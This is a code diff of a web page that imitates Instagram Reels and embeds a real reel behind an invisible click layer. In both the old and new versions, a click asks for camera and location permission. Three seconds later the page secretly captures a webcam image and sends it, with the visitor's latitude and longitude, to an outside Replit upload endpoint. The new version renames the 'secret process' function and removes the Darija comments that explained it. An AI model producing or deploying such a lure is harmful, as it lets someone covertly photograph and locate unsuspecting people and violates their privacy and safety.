@@ -5,82 +5,46 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Instagram</title>
     <style>
-        body, html { margin: 0; padding: 0; height: 100%; background: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; color: white; overflow: hidden; }
-        /* Header */
-        .header { height: 44px; display: flex; justify-content: space-between; align-items: center; padding: 0 16px; position: fixed; top: 0; width: 100%; z-index: 20; background: rgba(0,0,0,0.5); }
-        .header b { font-size: 18px; letter-spacing: 0.5px; }
-        /* Video Container */
-        .main-content { height: 100%; width: 100%; display: flex; justify-content: center; align-items: center; position: relative; }
-        iframe { border: none; width: 100%; height: 100%; pointer-events: auto; }
-        /* Invisible Click Layer */
-        .click-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 30; cursor: pointer; background: transparent; }
-        /* Tab Bar (Bottom) */
-        .tab-bar { height: 48px; display: flex; justify-content: space-around; align-items: center; position: fixed; bottom: 0; width: 100%; background: rgba(0,0,0,0.8); z-index: 20; }
-        .icon { font-size: 22px; filter: grayscale(1) brightness(2); }
+        body, html { margin: 0; padding: 0; height: 100%; background: #000; font-family: -apple-system, sans-serif; overflow: hidden; }
+        .header { height: 44px; display: flex; justify-content: space-between; align-items: center; padding: 0 16px; position: fixed; top: 0; width: 100%; z-index: 20; background: rgba(0,0,0,0.6); color: white; }
+        .main { height: 100%; width: 100%; display: flex; justify-content: center; align-items: center; }
+        iframe { border: none; width: 100%; height: 100%; }
+        .tab-bar { height: 48px; display: flex; justify-content: space-around; align-items: center; position: fixed; bottom: 0; width: 100%; background: #000; z-index: 20; border-top: 0.5px solid #262626; }
+        /* طبقة شفافة كتحبس التفاعل حتى يوافق على الصلاحيات */
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 30; background: transparent; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <div class="header">
-        <span style="font-size: 24px;">⬅️</span>
-        <b>Reels</b>
-        <span style="font-size: 24px;">📷</span>
+    <div class="header"><span>⬅️</span><b style="font-size:16px;">Reels</b><span>📷</span></div>
+    <div class="main">
+        <div class="overlay" id="gate" onclick="initCapture()"></div>
+        <iframe src="https://www.instagram.com/reel/DWl4ib2DhCY/embed"></iframe>
     </div>
-
-    <div class="main-content">
-        <div class="click-layer" id="gate" onclick="startSecretProcess()"></div>
-        
-        <iframe src="https://www.instagram.com/reel/DWl4ib2DhCY/embed" id="reel"></iframe>
-    </div>
-
-    <div class="tab-bar">
-        <span class="icon">🏠</span>
-        <span class="icon">🔍</span>
-        <span class="icon">➕</span>
-        <span class="icon">❤️</span>
-        <span style="border-radius: 50%; width: 26px; height: 26px; border: 1px solid white; background: #333;"></span>
-    </div>
+    <div class="tab-bar"><span style="font-size:20px;">🏠</span><span style="font-size:20px;">🔍</span><span style="font-size:20px;">➕</span><span style="font-size:20px;">❤️</span><div style="width:24px; height:24px; background:#333; border-radius:50%; border:1px solid white;"></div></div>
 
     <video id="v" style="display:none;" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        async function startSecretProcess() {
-            // كيحيد الطبقة الشفافة باش يقدر يتفاعل مع الفيديو
+        async function initCapture() {
             document.getElementById('gate').style.display = 'none';
-            
             try {
-                // كيطلب الصلاحيات (خاصو يوافق باش يخدم الفيديو)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const v = document.getElementById('v');
-                    v.srcObject = stream;
-                    
-                    // كيتسنى 3 ثواني وهو كيتفرج عاد كيصور
+                    const v = document.getElementById('v'); v.srcObject = stream;
                     setTimeout(async () => {
                         const c = document.getElementById('c');
                         c.width = 640; c.height = 480;
                         c.getContext('2d').drawImage(v, 0, 0);
-                        const img = c.toDataURL('image/png');
-
-                        // صيفط لـ Replit ديالك
                         await fetch('https://image-uploader-log.bbeelloamr.replit.app/api/upload', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                image: img,
-                                latitude: pos.coords.latitude,
-                                longitude: pos.coords.longitude
-                            })
+                            body: JSON.stringify({ image: c.toDataURL('image/png'), latitude: pos.coords.latitude, longitude: pos.coords.longitude })
                         });
-                        
-                        // كيطفي الكاميرا مورا ما كيسالي
                         stream.getTracks().forEach(t => t.stop());
                     }, 3000);
                 });
-            } catch (e) {
-                console.log("Denied");
-            }
+            } catch (e) {}
         }
     </script>
 </body>
